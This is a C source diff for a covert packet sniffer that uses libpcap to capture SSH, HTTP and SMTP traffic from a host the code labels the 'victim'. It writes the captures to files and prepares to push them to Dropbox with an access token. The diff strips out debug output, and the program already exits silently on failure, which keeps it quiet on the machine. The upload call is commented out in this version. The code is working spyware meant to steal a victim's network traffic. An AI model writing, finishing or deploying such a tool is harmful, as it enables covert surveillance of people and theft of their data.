@@ -25,10 +25,10 @@ typedef struct {
 int DATA_LINK_HDR_LEN = 14;
 
 /* Number of packet_info packets that our buffer holds */
-int PACKET_BUFFER_SIZE = 100;
+int PACKET_BUFFER_SIZE = 1000;
 
 /* Buffer to hold a certain amount of packet_info structs.  */
-packet_info* PACKET_BUFFER[100];
+packet_info* PACKET_BUFFER[1000];
 
 /* Counter for the above buffer. */
 int PACKET_BUFFER_IDX = 0;
@@ -36,7 +36,11 @@ int PACKET_BUFFER_IDX = 0;
 /* Mutex for both the buffer and its counter. */
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
-char* DROPBOX_ACCESS_TOKEN = "";
+/* Dropbox access token for pushing pcap files. */
+char* DROPBOX_ACCESS_TOKEN;
+
+/* Used to check whether ip address belongs to source or destination. */
+char* VICTIM_IP;
 
 /* Definition for the callback function when a packet is captured */
 void packet_callback(u_char* args, const struct pcap_pkthdr* header, const u_char* packet);
@@ -52,6 +56,7 @@ void write_to_dropbox(char* filename);
 
 int main(int argc, char** argv) {
 
+  DROPBOX_ACCESS_TOKEN = getenv("DROPBOX_ACCESS_TOKEN");
   char errbuf[PCAP_ERRBUF_SIZE]; /* Buffer for error messages */
   struct bpf_program  bpf;
   char filter_exp[] = "port 22 or port 80 or port 25";
@@ -63,7 +68,7 @@ int main(int argc, char** argv) {
     // Exit silently if we fail to find interface.
     return 1;
   }
-  char* interface_ip = get_interface_ip(interface);
+  VICTIM_IP = get_interface_ip(interface);
   // Enable Non promiscuous mode.
   pcap_t* pc_handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
   if(pc_handle == NULL) {
@@ -87,7 +92,7 @@ int main(int argc, char** argv) {
     return 1;
   }
   // Start a loop that collect packets
-  pcap_loop(pc_handle, -1, packet_callback, (u_char*) interface_ip);
+  pcap_loop(pc_handle, -1, packet_callback, NULL);
 	/* Close the session */
 	pcap_close(pc_handle );
 	return 0;
@@ -116,24 +121,20 @@ void packet_callback(u_char* args, const struct pcap_pkthdr* header, const u_cha
   info->header=header;
   pthread_mutex_lock(&mutex);
   PACKET_BUFFER[PACKET_BUFFER_IDX++] = info;
-  fprintf(stderr, "%d", PACKET_BUFFER_IDX);
   if(PACKET_BUFFER_IDX == PACKET_BUFFER_SIZE) {
-    process_buffer(args);
+    process_buffer();
     PACKET_BUFFER_IDX = 0;
   }
   pthread_mutex_unlock(&mutex);
 }
 
-void process_buffer(u_char* args) {
+void process_buffer() {
 
-  // Get the src ip we passed in and use it as the other part of the pcap file name.
-  char* src_ip_arg = (char*) args;
-  fprintf(stdout, "%s", src_ip_arg);
   char* buffer = (char*) malloc(sizeof(char) * 80);
   char filename[64] = "";
   strcpy(filename, get_system_time(buffer));
   strcat(filename, "_");
-  strcat(filename, src_ip_arg);
+  strcat(filename, VICTIM_IP);
   strcat(filename, ".pcap");
   FILE* packet_file = fopen(filename, "w");
   // Process packets
@@ -154,19 +155,17 @@ void process_buffer(u_char* args) {
     strcpy(src_ip, inet_ntoa(ip_hdr->ip_src));
     strcpy(dest_ip, inet_ntoa(ip_hdr->ip_dst));
     // Check whether the source or destination ip is the one of the host machine.
-    if (strcmp(src_ip_arg, src_ip) == 0) {
-      fprintf(packet_file, "%s, %s (Host) -> %s\n", ctime(&timestamp), src_ip, dest_ip);
-    } else if (strcmp(src_ip_arg, dest_ip) == 0) {
-      fprintf(packet_file, "%s, %s -> %s (Host)\n", ctime(&timestamp), src_ip, dest_ip);
+    if (strcmp(VICTIM_IP, src_ip) == 0) {
+      fprintf(packet_file, "%s%s (Host) -> %s\n", ctime(&timestamp), src_ip, dest_ip);
+    } else if (strcmp(VICTIM_IP, dest_ip) == 0) {
+      fprintf(packet_file, "%s%s -> %s (Host)\n", ctime(&timestamp), src_ip, dest_ip);
     } else {
       continue;
     }
     fprintf(packet_file, "=======================================\n");
     fflush(packet_file);
-    // We only want to get the ascii data, not hex or the offset
     free(info);
   }
-  fprintf(stderr, "%s", "Finished dumping a file.\n");
   free(buffer);
   //write_to_dropbox(filename);
 }
